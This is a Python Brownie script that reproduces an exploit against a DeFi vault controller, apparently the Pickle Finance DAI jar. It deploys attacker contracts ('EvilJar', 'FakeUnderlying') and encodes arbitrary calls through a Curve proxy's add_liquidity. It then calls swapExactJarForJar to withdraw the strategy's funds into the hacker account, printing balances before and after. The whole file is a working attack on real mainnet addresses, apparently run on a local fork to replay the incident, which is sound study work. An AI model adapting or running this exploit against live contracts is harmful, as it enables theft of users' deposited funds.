from brownie import rpc, accounts, interface, EvilJar, FakeUnderlying
from tabulate import tabulate


def main():
    assert rpc.is_active()
    hacker = accounts[0]
    controller = interface.ControllerV4("0x6847259b2B3A4c17e7c43C54409810aF48bA5210")
    dai = interface.ERC20("0x6B175474E89094C44Da98b954EedeAC495271d0F")
    cdai = interface.ERC20("0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643")
    curve_proxy_logic = interface.CurveProxyLogic(
        "0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8"
    )
    jar = interface.PickleJar(controller.jars(dai))
    strategy = interface.Strategy(controller.strategies(dai))

    evil_jar = EvilJar.deploy(cdai, {"from": hacker})
    fake_underlying = FakeUnderlying.deploy(cdai, {"from": hacker})

    def arbitrary_call(to, sig, param=None):
        param = cdai if param is None else fake_underlying
        return curve_proxy_logic.add_liquidity.encode_input(
            to,
            sig[:10],
            1,
            0,
            param,
        )

    earns = 3
    datas = (
        [arbitrary_call(strategy, strategy.withdrawAll.encode_input())]
        + [arbitrary_call(jar, jar.earn.encode_input())] * earns
        + [
            arbitrary_call(
                strategy, strategy.withdraw["address"].encode_input(cdai), True
            )
        ]
    )
    targets = [curve_proxy_logic for _ in datas]

    contracts = {
        "controller": controller,
        "strategy": strategy,
        "dai jar": jar,
        "evil jar": evil_jar,
        "fake underlying": fake_underlying,
        "hacker": hacker,
    }

    def status():
        data = []
        for name, c in contracts.items():
            data.append([name, dai.balanceOf(c).to("ether"), cdai.balanceOf(c) / 1e8])
        print(tabulate(data, headers=["contract", "dai", "cdai"]))

    status()

    tx = controller.swapExactJarForJar(
        evil_jar,
        evil_jar,
        0,
        0,
        targets,
        datas,
        {"from": hacker},
    )

    status()
